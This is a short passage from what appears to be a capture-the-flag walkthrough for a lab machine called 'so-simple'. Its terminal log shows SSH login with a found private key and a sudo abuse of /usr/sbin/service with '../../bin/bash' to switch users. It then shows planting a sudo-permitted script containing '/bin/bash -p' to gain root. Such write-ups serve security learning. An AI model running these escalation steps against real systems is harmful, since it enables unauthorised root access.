# 6 ssh max > steven > root

```
$ chmod 600 max_id_rsa
$ ssh -i max_id_rsa max@192.168.105.78

max@so-simple:~$ whoami;id;hostname
max
uid=1000(max) gid=1000(max) groups=1000(max),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
so-simple

max@so-simple:~$ sudo -l
Matching Defaults entries for max on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
	
# we are max
# sudo can run as steven for /usr/sbin/service

max@so-simple:~$ sudo -u steven /usr/sbin/service
Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]

max@so-simple:~$ sudo -u steven /usr/sbin/service ../../bin/bash
steven@so-simple:/$ whoami;id
steven
uid=1001(steven) gid=1001(steven) groups=1001(steven)
steven@so-simple:/$ sudo -l
Matching Defaults entries for steven on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh

# nothing in /opt
# we can create this file and run as root

steven@so-simple:$ mkdir /opt/tools
steven@so-simple:$ echo "/bin/bash -p" > /opt/tools/server-health.sh
steven@so-simple:$ chmod +x /opt/tools/server-health.sh
steven@so-simple:$ sudo /opt/tools/server-health.sh
root@so-simple:# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```
